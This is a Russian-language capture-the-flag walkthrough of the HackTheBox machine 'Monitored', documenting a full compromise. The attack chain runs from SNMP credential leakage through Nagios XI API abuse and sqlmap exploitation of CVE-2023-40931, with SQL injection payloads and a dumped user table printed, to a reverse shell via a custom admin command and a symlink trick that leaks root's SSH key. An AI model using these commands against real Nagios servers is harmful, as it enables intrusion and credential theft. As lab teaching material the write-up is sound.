# Monitored (2026)

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

## Тэги:

* SNMP
* Nagios XI API & CVE-2023–40931 (SQL Injection)
* Symbolic links PrivEsc

## Разведка

Результат сканирования `TCP`-портов:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Monitored]
└─$ sudo nmap -sC -sV 10.129.230.96 -oN nmap.out
[sudo] password for trager: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 06:11 EST
Nmap scan report for monitored.htb (10.129.230.96)
Host is up (0.040s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp  open  http     Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

При переходе на `80` порт `http://10.129.230.96/` идёт редирект на `nagios.monitored.htb`. Соответствующие записи были добавлены в `/etc/hosts`:

```
10.129.230.96 monitored.htb nagios.monitored.htb
```

После чего был получен доступ к поддомену:

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

На нем располагается мониторинговая платформа `Nagios XI`. С помощью кнопки `"Access Nagios XI"` происходит перенаправление на страницу авторизации - `https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1`:

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

Далее были просканированы `UDP`-порты:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Monitored]
└─$ sudo nmap -sU 10.129.230.96
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 06:37 EST
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
123/udp open          ntp
161/udp open          snmp
162/udp open|filtered snmptrap
```

Поскольку `SNMP`-порт открыт можно было попытаться извлечь из него информацию с помощью `snmpbulkwalk`:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Monitored]
└─$ snmpbulkwalk -c public -v2c 10.129.230.96 .
iso.3.6.1.2.1.1.1.0 = STRING: "Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (323466) 0:53:54.66
iso.3.6.1.2.1.1.4.0 = STRING: "Me <root@monitored.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "monitored"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
<...вырезано...>
iso.3.6.1.2.1.25.4.2.1.5.626 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
```
{% endcode %}

В выводе было обнаружено имя пользователя и пароль. При вводе данных на странице авторизации выводиться уже другое сообщение:

<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

Было использовано `API` `Nagios XI` для получения `auth_token`:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/Desktop]
└─$ curl -X POST "http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1" -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=60"
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "257ddcf6819f2d6559f94b4bc530b9eb30ef30f8",
    "valid_min": 60,
    "valid_until": "Wed, 07 Jan 2026 15:34:02 -0500"
}
```
{% endcode %}

Чтобы в дальнейшем авторизоваться в сервисе с помощью следующего `URL` -`https://nagios.monitored.htb/nagiosxi/login.php?token=257ddcf6819f2d6559f94b4bc530b9eb30ef30f8`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure></div>

После авторизации был обнаружено, что `Nagios XI` версии `5.11.0`. Для неё есть [эксплоит на SQL Injection](https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c).

Чтобы подтвердить уязвимость нужно сформировать следующий `GET`-запрос:

<figure><img src="../../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

## Получение первоначального доступа - nagios (CVE-2023–40931, Admin Panel Reverse Shell)

Чтобы проэксплуатировать уязвимость в автоматическом режиме можно использовать `sqlmap`:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Monitored]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=8s538hfboc5luue47bdpoin5m4" --dbs --threads=10
        ___
       __H__                                                                                                                                                                                          
 ___ ___[(]_____ ___ ___  {1.9.2#stable}                                                                                                                                                              
|_ -| . [(]     | .'| . |                                                                                                                                                                             
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:05:14 /2026-01-09/

[03:05:14] [INFO] resuming back-end DBMS 'mysql' 
[03:05:14] [INFO] testing connection to the target URL
[03:05:14] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (4592=4592) THEN 3 ELSE (SELECT 3064 UNION SELECT 9496) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 8717 FROM(SELECT COUNT(*),CONCAT(0x7178767071,(SELECT (ELT(8717=8717,1))),0x7171786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 7522 FROM (SELECT(SLEEP(5)))YRpc)
---
[03:05:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[03:05:14] [INFO] fetching database names
[03:05:14] [INFO] starting 2 threads
[03:05:14] [INFO] resumed: 'information_schema'
[03:05:14] [INFO] resumed: 'nagiosxi'
available databases [2]:
[*] information_schema
[*] nagiosxi

[03:05:14] [INFO] fetched data logged to text files under '/home/trager/.local/share/sqlmap/output/nagios.monitored.htb'
[03:05:14] [WARNING] your sqlmap version is outdated

[*] ending @ 03:05:14 /2026-01-09/
```
{% endcode %}

База данных `information_schema` в `mysql` создается по умолчанию, а `nagiosxi` была создана уже мониторинговой платформой. С помощью той же утилиты `sqlmap` была извлечена вся необходимая информация для дальнейшего продвижения.

* Извлечение списка таблиц:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Monitored]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=8s538hfboc5luue47bdpoin5m4" --tables -D nagiosxi --threads=10
        ___
       __H__                                                                                                                                                                                          
 ___ ___[']_____ ___ ___  {1.9.2#stable}                                                                                                                                                              
|_ -| . [(]     | .'| . |                                                                                                                                                                             
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:12:21 /2026-01-09/

<...вырезано...>
Database: nagiosxi
[22 tables]
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+

[03:12:23] [INFO] fetched data logged to text files under '/home/trager/.local/share/sqlmap/output/nagios.monitored.htb'
[03:12:23] [WARNING] your sqlmap version is outdated

[*] ending @ 03:12:23 /2026-01-09/
```
{% endcode %}

* Излечение данных из таблицы `xi_users`:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Monitored]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=8s538hfboc5luue47bdpoin5m4" --dump -T xi_users -D nagiosxi --threads=10
        ___
       __H__                                                                                                                                                                                                                                                                                                                                                                                                     
 ___ ___[']_____ ___ ___  {1.9.2#stable}                                                                                                                                                                                                                                                                                                                                                                         
|_ -| . [']     | .'| . |                                                                                                                                                                                                                                                                                                                                                                                        
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                                                                                                                                                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                                                                                                                                                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:13:03 /2026-01-09/

<...вырезано...>
Database: nagiosxi
Table: xi_users
[2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1699730174   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 3              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+

[03:13:04] [INFO] table 'nagiosxi.xi_users' dumped to CSV file '/home/trager/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/xi_users.csv'
[03:13:04] [INFO] fetched data logged to text files under '/home/trager/.local/share/sqlmap/output/nagios.monitored.htb'
[03:13:04] [WARNING] your sqlmap version is outdated

[*] ending @ 03:13:04 /2026-01-09/
```
{% endcode %}

В дампе таблицы было два `API`-ключа. Используя ключ `nagiosadmin`,  можно было создать любого другого пользователя с правами администратора:

{% code overflow="wrap" %}
```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Monitored/CVE-2023-47400]
└─$ curl -X POST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=TragerSec_&password=tragersec&name=tragersec&email=tragersec@localhost&auth_level=admin"
{
    "success": "User account tragersec_ was added successfully!",
    "user_id": 7
}
```
{% endcode %}

Далее можно авторизоваться в сервисе. Поскольку использовался простой пароль при создании нового пользователя, то система попросила его сменить:

<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

После чего доступ к панели администратора был открыт:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

С помощью этой панели можно было получить удаленный доступ, используя команды (`Configure` -> `Core Config Manager`):

<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

Переход в меню команд (`Configure` -> `Core Config Manager` -> `Commands` -> `Commands`):

<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

Пэйлоад для команды можно сгенерировать через [Reverse Shell Generator](https://www.revshells.com/):

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

Далее можно добавить свою команду с полезной нагрузкой:

<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>

Чтобы её запустить, нужно зайти во вкладку `Hosts` (`Core Config Manager` -> `Monitoring` -> `Hosts`):&#x20;

<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

И выбрать `localhost`:

<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

Затем выбрать свою команду из списка:

<figure><img src="../../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

И нажать `Run Check Command`:

<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

На листенер придет реверс шелл:

<figure><img src="../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

## Повышение привилегий - root (Замена файла на символьную ссылку в скрипте)

С помощью `sudo -l` были обнаружены команды, которые может выполнять пользователь `nagios` от лица суперпользователя:

<figure><img src="../../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

При изучении скрипта `getprofile.sh` было обнаружено, что во время выполнения в `phpmailer.log` записываются последние `100` строк файла `/usr/local/nagiosxi/tmp/phpmailer.log`. Его можно изменить и указать символическую ссылку на `/root/.ssh/id_rsa`:

{% code overflow="wrap" %}
```bash
<...вырезано...>
folder=$1
if [ "$folder" == "" ]; then
echo "You must enter a folder name/id to generate a profile."
echo "Example: ./getprofile.sh <id>"
exit 1
fi
<...вырезано...>
echo "Getting phpmailer.log..."
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
 tail -100 /usr/local/nagiosxi/tmp/phpmailer.log >
"/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
fi
<...вырезано...>
```
{% endcode %}

Удаление файла, создание символической ссылки и запуск скрипта:

{% code overflow="wrap" %}
```shellscript
nagios@monitored:/usr/local/nagiosxi/tmp$ rm phpmailer.log
nagios@monitored:/usr/local/nagiosxi/tmp$ ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
nagios@monitored:/usr/local/nagiosxi/tmp$ cp /usr/local/nagiosxi/var/components/profile.zip /tmp
nagios@monitored:/usr/local/nagiosxi/tmp$ cd /tmp
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

Далее полученный архив был распакован:

<figure><img src="../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

И прочитан файл `phpmailer.log` с содержимым `id_rsa` суперпользователя:

<figure><img src="../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

С помощью него можно подключиться к хосту через `SSH` предварительно задав ему права только на чтение и запись владельцу (`600`):

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

